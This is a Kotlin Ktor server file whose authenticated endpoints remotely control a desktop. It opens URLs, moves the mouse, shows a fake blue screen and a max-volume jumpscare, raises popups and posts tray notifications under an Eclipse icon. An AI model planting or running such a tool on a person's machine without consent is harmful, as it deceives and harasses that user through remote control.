package webserver.cm.it.plugins

import io.ktor.http.*
import io.ktor.server.application.*
import io.ktor.server.auth.*
import io.ktor.server.request.*
import io.ktor.server.response.*
import io.ktor.server.routing.*
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import webserver.cm.it.App
import webserver.cm.it.request.DialogModel
import webserver.cm.it.request.NotificationModel
import java.awt.*
import java.io.File
import java.net.URI
import javax.sound.sampled.*
import javax.swing.*
import javax.swing.WindowConstants.DISPOSE_ON_CLOSE
import kotlin.random.Random
import kotlin.system.exitProcess

fun Application.configureRouting() {
    routing {
        authenticate("myauth1") {
            get("/version") {
                call.respond("1.1-SNAPSHOT")
            }
            get("/ping") {
                call.respond(HttpStatusCode.OK)
            }
            post("/shutdown") {
                File(".shutdown").createNewFile()
                exitProcess(1)
            }
            post("/browse") {
                Desktop.getDesktop().browse(URI(call.receiveText()))
                call.respond(HttpStatusCode.OK)
            }
            post("/popup") {
                val model = call.receive<DialogModel>()
                launch {
                    createPopup(model)
                }
                call.respondText("OK")
            }
            get("/move_mouse") {
                launch {
                    val random = Random.Default
                    for (i in 0..5) {
                        Robot().mouseMove(
                            random.nextInt(1920), random.nextInt(1080)
                        )
                        delay(random.nextLong(3000) + 3000)
                    }
                }
                call.respond(HttpStatusCode.OK)
            }
//            get("/right_click") {
//                Robot().mousePress(InputEvent.BUTTON3_DOWN_MASK)
//            }
//            get("/play") {
//                launch {
//                    Desktop.getDesktop().browse(URI(call.receiveText()))
//                }
////                systemVolumeToMAX()
//                call.respond(HttpStatusCode.OK)
//            }
            get("/jumpscare") {
                launch {
                    playSong(
                        "/jumpscare.wav"
                        , { frameWithImage("/jumpscare.jpg") }
                        , { (it as JFrame).dispose() }
                    )
                }
                call.respond(HttpStatusCode.OK)
            }
            get("/blue_screen") {
                launch {
                    with(frameWithImage("/blue_screen.png")) {
                        delay(5000)
                        dispose()
                    }
                }
                call.respond(HttpStatusCode.OK)
            }
            post("/notification") {
                val model = call.receive<NotificationModel>()
                launch {
                    notification(model)
                }
            }
        }
    }
}

fun notification(model: NotificationModel) {
    //Obtain only one instance of the SystemTray object
    val tray = SystemTray.getSystemTray()

    //If the icon is a file
    val image = Toolkit.getDefaultToolkit().createImage(App::class.java.getResource("/eclipse.ico"))
    //Alternative (if the icon is on the classpath):
    //Image image = Toolkit.getDefaultToolkit().createImage(getClass().getResource("icon.png"));

    val trayIcon = TrayIcon(image, "Tray Demo")
    //Let the system resize the image if needed
    trayIcon.isImageAutoSize = true
    //Set tooltip text for the tray icon
    trayIcon.toolTip = model.tooltip
    tray.add(trayIcon)

    trayIcon.displayMessage(model.title, model.description, model.type)
}

fun playSong(filePath: String, beforePlay: ()->Any, afterPlay: (Any)->Unit) {
    try {
        val audioInputStream = AudioSystem.getAudioInputStream(App::class.java.getResourceAsStream(filePath))
        val audioFormat = audioInputStream.format
        val info = DataLine.Info(SourceDataLine::class.java, audioFormat)

        val sourceDataLine = AudioSystem.getLine(info) as SourceDataLine
        sourceDataLine.open(audioFormat)

        val controls = sourceDataLine.controls
        for (control in controls) {
            if (control is FloatControl && control.type == FloatControl.Type.MASTER_GAIN) {
                val maxVolume = control.maximum
                control.value = maxVolume
                break
            }
        }


        val buffer = ByteArray(4096)
        var bytesRead: Int

        val returned = beforePlay()
        sourceDataLine.start()
        while (audioInputStream.read(buffer).also { bytesRead = it } != -1) {
            sourceDataLine.write(buffer, 0, bytesRead)
        }
        afterPlay(returned)

        sourceDataLine.drain()
        sourceDataLine.close()
        audioInputStream.close()

    } catch (e: Exception) {
        println("Si è verificato un errore durante la riproduzione del brano: ${e.message}")
    }
}

private fun frameWithImage(imagePath: String): JFrame =
    JFrame().apply {
        val current = this
        isUndecorated = true
        extendedState = JFrame.MAXIMIZED_BOTH
//        size = Dimension(200, 200)
//                        contentPane.background = Color.BLUE
        isAlwaysOnTop = true
        layout = GridLayout()

        contentPane.add(
            JLabel(ImageIcon(App::class.java.getResource(imagePath))).apply {
                setSize(current.width, current.height)
            }
        )

        isVisible = true
    }

private fun createPopup(model: DialogModel) {
    SwingUtilities.invokeLater {
        val frame = JFrame().apply {
            val thisFrame = this
            title = model.title
            layout = BorderLayout()
            defaultCloseOperation = DISPOSE_ON_CLOSE
            contentPane.background = Color(40, 40, 40)
            setLocationRelativeTo(null)
            isUndecorated = true
            minimumSize = Dimension(300, 100)

            contentPane.add(
                JPanel().apply {
                    background = Color(40, 40, 40)
                    add(
                        InfoIconCanvas().apply {
                            background = Color(40, 40, 40)
                            preferredSize = Dimension(40, 40)
                        }
                    )
                }, BorderLayout.WEST
            )
            contentPane.add(
                JPanel().apply {
                    layout = GridBagLayout()
                    background = Color(40, 40, 40)
                    border = BorderFactory.createEmptyBorder(10, 10, 10, 10)

                    add(
                        JPanel().apply {
                            layout = BoxLayout(this, BoxLayout.Y_AXIS)
                            background = Color(40, 40, 40)
                            add(
                                JLabel(model.title).apply {
                                    font = Font("Arial", Font.BOLD, 16)
                                    foreground = Color.WHITE
                                    alignmentX = Component.LEFT_ALIGNMENT
                                }
                            )
                            add(
                                JLabel(model.description).apply {
                                    font = Font("Arial", Font.PLAIN, 14)
                                    foreground = Color.LIGHT_GRAY
                                    alignmentX = Component.LEFT_ALIGNMENT
                                }
                            )
                        }
                    )
                }
            )
            contentPane.add(
                JPanel().apply {
                    background = Color(40, 40, 40)
                    layout = FlowLayout(FlowLayout.RIGHT)
                    add(
                        JButton("Close").apply {
//                            background = Color(40, 40, 40)
                            foreground = Color(40, 40, 40)
//                            isContentAreaFilled = false
                            isOpaque = true
                            border = BorderFactory.createEmptyBorder(5, 10, 5, 10)
                            addActionListener {
                                thisFrame.dispose()
                            }
                        }
                    )
                }, BorderLayout.SOUTH
            )

            requestFocus()
            isAlwaysOnTop = true
            pack()
            isVisible = true
        }
    }
}

class InfoIconCanvas: JPanel() {
    override fun paintComponent(g: Graphics?) {
        super.paintComponent(g)
        val iconSIze = 35
        val x = (width - iconSIze) / 2
        val y = (height - iconSIze) / 2

        val g2d = g as Graphics2D
        g2d.setRenderingHint(
            RenderingHints.KEY_ANTIALIASING
            , RenderingHints.VALUE_ANTIALIAS_ON
        )
        g2d.color = Color.WHITE
        g2d.fillOval(x, y, iconSIze, iconSIze)

        g2d.color = Color.BLUE
        g2d.font = Font("Arial", Font.ITALIC, 27)
        val text = "i"
        val fm = g2d.fontMetrics
        val textWidth = fm.stringWidth(text)
        val textHeight = fm.height
        val textX = x + (iconSIze - textWidth) / 2
        val textY = y + (iconSIze + textHeight) / 2 - fm.descent
        g2d.drawString(text, textX, textY)
    }
}